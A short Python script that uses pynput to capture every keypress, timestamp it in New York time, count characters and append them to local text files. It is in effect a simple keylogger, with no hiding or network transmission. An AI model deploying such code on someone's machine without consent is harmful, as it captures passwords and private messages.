from pynput import keyboard
from datetime import datetime
from zoneinfo import ZoneInfo

TIMEZONE = ZoneInfo("America/New_York")
keyCounts = {}

def keyPressed(key):
    timestamp = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S %Z")

    try:
        char = key.char
        if char is not None: #update count 
            keyCounts[char] = keyCounts.get(char, 0) + 1
            print(f"{timestamp} - {char}")
            with open("KeyFile.txt", 'a') as logKey:
                logKey.write(f"{timestamp} | {char}\n")
    except:
            print("-------")
        
            print(f"{timestamp} | {key}")
            with open("Key.txt", 'a') as logKey:
                logKey.write(f"{timestamp} - {key}\n")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()